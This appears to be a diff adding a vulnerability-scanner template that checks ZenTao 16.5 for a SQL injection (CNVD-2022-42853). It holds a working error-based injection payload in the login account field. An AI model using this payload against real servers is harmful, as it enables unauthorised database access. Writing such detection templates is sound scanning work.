@@ -1,0 +1,36 @@
+id: poc-local-zentao-sqli-cnvd-2022-42853
+
+info:
+  name: poc-local-zentao-sqli-cnvd-2022-42853
+  author: capiton
+  severity: critical
+  description: 禅道cnvd-2022-42853 zentao = v16.5
+  reference: http://wiki.peiqi.tech/wiki/cms/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%2016.5%20router.class.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  tags: zentao,sqli,sql,cnvd
+
+variables:
+  rand: "{{rand_int(100000,200000)}}"
+
+requests:
+  - raw:
+      - |-
+        POST /zentao/user-login.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{RootURL}}/zentao/user-login.html
+        Accept-Encoding: gzip
+
+        account=admin'+and+(select+extractvalue(1,concat(0x7e,(select+SUBSTR(MD5({{rand}}),9,16)),0x7e)))#
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,substr(md5("{{rand}}"), 8, 16))
+        condition: and
+
+      - type: status
+        status:
+          - 200
+        condition: and
